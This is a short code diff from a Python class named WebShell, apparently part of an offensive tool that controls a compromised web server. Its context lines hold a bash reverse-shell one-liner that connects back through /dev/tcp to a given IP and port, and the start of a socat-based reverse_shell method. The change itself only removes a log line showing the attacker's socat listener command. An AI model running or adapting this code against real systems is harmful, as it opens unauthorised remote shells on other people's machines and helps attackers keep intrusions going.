@@ -290,7 +290,6 @@ class WebShell():
         return self.auto_exec("bash -c 'sh -i >&/dev/tcp/%s/%s 0>&1'" % (ip, port))
 
     def reverse_shell(self, ip, port):
-        Log.info("socat file:`tty`,raw,echo=0 tcp-l:8888")
         result = self.check_bin_exists("socat")
         if result[0]:
             content = result[1][0:-1]
